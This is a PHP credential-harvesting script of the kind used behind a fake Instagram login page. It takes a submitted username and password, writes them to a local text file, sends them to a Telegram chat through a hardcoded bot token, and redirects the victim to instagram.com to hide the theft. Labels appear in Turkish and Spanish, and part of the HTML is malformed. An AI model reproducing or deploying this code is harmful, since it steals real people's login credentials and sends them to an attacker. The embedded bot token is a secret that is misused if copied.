<?php
 $user = $_POST["username"];
 $pass = $_POST["password"];

 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("deus.txt", "a") or die("Intentalo nuevamente");
 $us = "Username: $user\n";
 $pa = "Password: $pass\n";
 
  
  
  
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<font color='pink'> Form Sayfası: </font><br>
<font color='red'> Kullanıcı Adı: </font><font color='white'>".$us."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$pass."</font><br>
<hr />

"; 

$token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';

$data = [
    'text' => '

Kullanıcı Adı : '.$us.' 
Şifre : '.$pass.'
',
    'chat_id' =>-1001586201889
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

fwrite($fileuser, "\n". $co. $us. $pa. $cl);
 fclose($fileuser);
 header('Location: https://instagram.com/');
}
?>
